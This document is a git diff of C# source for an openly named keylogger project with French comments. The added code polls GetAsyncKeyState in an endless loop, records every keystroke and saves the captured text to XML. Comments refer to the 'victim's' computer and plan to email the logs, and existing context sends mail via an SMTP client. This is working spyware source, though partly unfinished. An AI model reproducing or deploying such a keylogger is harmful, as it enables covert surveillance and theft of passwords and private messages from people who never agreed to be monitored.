@@ -10,81 +10,106 @@ using System.Net.Mail;
 using System.Runtime.InteropServices;
 using Outlook = Microsoft.Office.Interop.Outlook;
 using System.Net.Mail;
+using System.Threading;
 
 namespace ProjetEspionKeyLogger
 {
     class KeyLogger
     {   
         //Texte saisie depuis le dernier clic ou, touche "entré", ou temps > 30 seconde
-        private Enregistrement enregistrement_courrant;
-        //Timer qui permet de gerer l'envoit des mails (toutes les 60 minutes)
-        private Timer timer_mail;
+        private CollectionEnregistrement collection_enregistrement;
+    
 
         //Constructeur(peut etre pas nécessaire)
         public KeyLogger()
         {
-
-            enregistrement_courrant = new Enregistrement();
-
-
-            //int test = GetAsyncKeyState(1);
-
-            //Affiche la date du jour
-            Console.WriteLine(enregistrement_courrant.dateTimeNow());
+            //On initialise la collection
+            collection_enregistrement = new CollectionEnregistrement();
         }
 
-        //Méthode permettant de démarrer le timer d'envoie des mails
-        public void demarrerTimerMail()
+        //GetAsyncKeyState function : permet de savoir si une touche ets activé ou non
+        //Cette fonction vient d'une librairie stockée dans user32.dll (le keylogger ne marche donc que sur windows, pas mac)
+        // l'argument est une "virtual key code " car chaque action est asscoiée à une clé
+
+
+        [DllImport("user32.dll")]
+        public static extern int GetAsyncKeyState(int cle);
+
+        public void capture()
         {
-            timer_mail = new Timer()
+            //Création d'un objet Enregistrement qui contiendra le contenu de la capture clavier
+            Enregistrement enregistrement = new Enregistrement();
+
+            //Initialisation du nombre de caractere tapé
+            int nb_caractere_tape = 0;
+
+            //capture les frappes de touches et les afficher dans la console
+            while (true) //boucle "infinie" pour avoir le statut des touches en temps réel
             {
-                //Toute les heures
-                Interval = 60000000
-            };
-
-            //!!! PROVISOIR EN ATTENDANT DE COMPRENDRE !!!
-            timer_mail.Tick += Timer_Tick;
-        }
-
-        //Boucle qui va toutes les X seconde, écrire dans un fichier txt
-        private void demarrerTimerEnregistrement()
-        {
-
-        }
+                //Comme on a une boucle infinie, il faut permettre aux autres fonctions de se déclencher et donc arreter la boucle temporairement
+                Thread.Sleep(5); //nombre en miliseconde
 
 
+                //verification de l'état de chaque touche (up ou down)
+                //avec une table des code ASCII, les codes de clavier vont de 0 à 127
+                //on va vérifier ces 128 touches
+                for (int codeASCII = 0; codeASCII < 128; codeASCII++)
+                {
+                    int statut_cle = GetAsyncKeyState(codeASCII);
+                    //le statut d'un clé est a 0 si elle n'est pas active
+                    //le statut est a 32769 si la touche est appuyé donc on va pouvoir voir les touches
+                    // on caste le nombre ascii en char
+                    if (statut_cle == 32769)
+                    {
+                        Console.Write((char)codeASCII);
 
-        //!!! PROVISOIR EN ATTENDANT DE COMPRENDRE !!!
-        private void Timer_Tick(object sender, EventArgs e)
-        {
-            //Envoyer le mail
-        }
+                        //Concatenation e la derniere touche tapée au contenu de l'enregistrement
+                        enregistrement.ajouterContenu((char)codeASCII);
+
+                        //probleme : tout en majuscule + certaines touches non detectées
+                        //je pense que c'est obligé d'être réglé dans la partie interface
+
+                        //ecriture dans un fichier texte
+                        // KeyLogger.enregistreTxt((char)codeASCII);
+
+                        //toutes les x minutes envoyer le fichier
+
+                        //effacer le fichier le contenu pour avoir le nouveau contenu
+
+                        //Si touche Entrée
+                        if (codeASCII == 13)
+                        {
+                            //On ajoute l'enregistrement a la collection
+                            collection_enregistrement.ajouter(enregistrement);
+
+                            //On réinitialise l'enregistrement
+                            enregistrement = new Enregistrement();
+                        }
+                        else
+                        {
+                            //Sinon on incrémente le nombre de caracteres tapé
+                            nb_caractere_tape += 1;
+                        }
+
+                        //Si plus de 100 caracteres ont été tapé
+                        if (nb_caractere_tape > 200)
+                        {
+                            //On enregistre le contenue en xml
+                            collection_enregistrement.saveToXml("TestXML.xml");
+
+                            //On reinitialise le nombre de caracteres
+                            nb_caractere_tape = 0;
+
+                            //On réinitialise la collection
+                            collection_enregistrement = new CollectionEnregistrement();
+
+                            //Puis on envoie un mail
+
+                        }
 
 
-        //Méthode qui écrit la saisie dans un .txt
-        private void enregistreTxt(int texte)
-        {
-
-            //chemin dynamique car on l'enregistre sur l'ordinateur de la victime
-            string chemin_Dossier = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
-
-            //Si la victime n'a pas de dossier "mes documents" alors on en crée un
-            if (Directory.Exists(chemin_Dossier))
-            {
-                Directory.CreateDirectory(chemin_Dossier);
-            }
-
-            //Création du fichier texte
-            using (StreamWriter sw = File.CreateText(chemin_Dossier + @"\CaptureClavier.txt"))
-            {
-
-            }
-
-            //Ecriture
-            using (StreamWriter sw = File.AppendText(chemin_Dossier + @"\CaptureClavier.txt"))
-            {
-                sw.Write(texte);
-
+                    }
+                }
             }
         }
 
@@ -141,15 +166,6 @@ namespace ProjetEspionKeyLogger
             //Envoie du message
             Client.Send(Message_Mail);
 
-        }
-
-        //sauvegarde dans un fichier XML
-        public void saveToXml(string nomFichier)
-        {
-           /* FileStream file = File.Open(nomFichier, FileMode.Create);
-            XmlSerializer serializer = new XmlSerializer(typeof(ListeEmployes));
-            serializer.Serialize(file, this);
-            file.Close();*/
         }
 
 
